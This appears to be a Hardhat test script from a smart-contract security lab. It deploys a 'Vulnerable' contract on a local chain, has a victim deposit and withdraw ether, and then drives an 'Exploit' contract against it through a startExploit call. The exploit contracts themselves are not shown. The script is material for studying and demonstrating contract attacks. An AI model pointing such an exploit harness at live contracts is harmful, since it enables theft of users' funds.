const { expect } = require("chai");
const hre = require("hardhat");

const { parseEth,balanceToHex,getBlockchainTime,setBlockchainTime } = require("./utils.js");
const seven_days_to_seconds = 7 * 24 * 60 * 60; // 7 days in seconds.

async function deployVulnerable(deployer) {
    const VulnerableFactory = await hre.ethers.getContractFactory("Vulnerable",deployer);
    let vulnerable = await VulnerableFactory.connect(deployer).deploy();
    console.log("Vulnerable contract has been deployed to :",vulnerable.address);
    return vulnerable;
}


async function attack(vulnerable,attacker) {
    const ExploitFactory = await hre.ethers.getContractFactory("Exploit");
    let exploit = await ExploitFactory.deploy(vulnerable.address);

    await exploit.connect(attacker).deposit({value: parseEth('50','ether')});


    await setBlockchainTime(await getBlockchainTime() + seven_days_to_seconds + 100000);
    await exploit.connect(attacker).startExploit(parseEth('50','ether'));
}


async function main() {
    const [deployer,attacker,victim,unprivileged] = await hre.ethers.getSigners();
    const vulnerable = await deployVulnerable(deployer);

    // deployer should be the owner of the contract.
    await expect(await vulnerable.connect(unprivileged).owner()).to.be.equal(deployer.address);

    // sending 10 ether to vulnerable contract.
    await deployer.sendTransaction({ 
    to: vulnerable.address,
    value: ethers.utils.parseEther("10")
    })

    // set balance of the victim to 100 ether.
    let balance = await balanceToHex(parseEth('100','ether'));
    await ethers.provider.send("hardhat_setBalance", [victim.address, balance]);

    // victim user deposits 50 ether to vulnerable contract.
    let depositAmount = parseEth('50','ether');
    let depositedTx = await vulnerable.connect(victim).deposit({value: depositAmount});
    await expect(depositedTx).to.emit(vulnerable,'Deposited').withArgs(victim.address,depositAmount);

    // the balance of the victim user on vulnerable contract should be equal to 50 ether.
    let victimBal = await vulnerable.connect(unprivileged).balanceOf(victim.address);
    await expect(victimBal).to.be.equal(depositAmount);
    console.log("Balance of the victim on vulnerable contract : ",await ethers.utils.formatEther(victimBal));

    let currentBlockTime = await getBlockchainTime();
    console.log("[1] Current block timestamp before block fast-forward : ",currentBlockTime);

    // fast-forward (time-travel) to 7 days in future.
    await setBlockchainTime(currentBlockTime + seven_days_to_seconds);
    console.log("[2] Current block timestamp after block fast-forward : ",await getBlockchainTime());

    // victim withdrawing 50 ether from the contract.
    await vulnerable.connect(victim).withdraw(parseEth('50','ether'));
    await expect(await vulnerable.connect(unprivileged).balanceOf(victim.address)).to.be.equal(0);

    // ============== ATTACK ================ //
    await attack(vulnerable,attacker);
}


// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
